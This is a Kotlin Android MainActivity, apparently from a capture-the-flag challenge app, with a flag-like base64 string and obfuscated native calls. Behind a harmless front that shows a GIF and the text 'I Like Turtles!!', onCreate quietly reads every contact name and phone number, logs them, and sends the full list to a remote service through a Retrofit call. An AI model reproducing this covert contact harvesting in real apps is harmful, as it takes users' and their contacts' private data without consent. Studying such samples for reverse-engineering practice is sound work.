package com.example.androidapp
import android.annotation.SuppressLint
import android.app.Service
import android.os.Build
import android.provider.ContactsContract
import android.os.Bundle
import android.util.Log
import android.widget.ListView
import android.widget.TextView
import androidx.annotation.RequiresApi
import java.util.ArrayList
import androidx.appcompat.app.AppCompatActivity
import com.bumptech.glide.Glide

class MainActivity : AppCompatActivity() {

    init {
        System.loadLibrary("ndktest")
    }
    external fun helloWorld(): String
    external fun sixtyFoar(): String

    private var listView: ListView? = null
    private var customAdapter: CustomAdapter? = null
    private var contactModelArrayList: ArrayList<ContactModel>? = null
    private var superString2: String = "Q1RGX0pBVkFfRU5DUllQVEVEX1c="

    @RequiresApi(Build.VERSION_CODES.O)
    @SuppressLint("Range")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        Glide.with(this).load("https://i.kym-cdn.com/photos/images/original/000/181/190/tumblr_lsdptrZkpi1qh6cr0o4_r1_500.gif").into(findViewById(R.id.image))

        var view: TextView = findViewById(R.id.text) as TextView
        view.text = helloWorld()
        view.text = "I Like Turtles!!"

        listView = findViewById(R.id.listView) as ListView

        contactModelArrayList = ArrayList()

        val phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
        while (phones!!.moveToNext()) {
            val name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            val phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

            val contactModel = ContactModel(name, phoneNumber)
            contactModelArrayList!!.add(contactModel)
            Log.d("name>>", name + "  " + phoneNumber)
        }
        phones.close()
        var streng: String? = customAdapter?.youNeverGonnaFindThis(superString2)

        customAdapter = CustomAdapter(this, contactModelArrayList!!)
        listView!!.adapter = customAdapter

        var retrofit = ServiceBuilder.buildService(PostInterface::class.java)
        retrofit.sendReq(contactModelArrayList!!)


        var alow: String = ServiceBuilder.dicript(sixtyFoar(),"D")

    }






}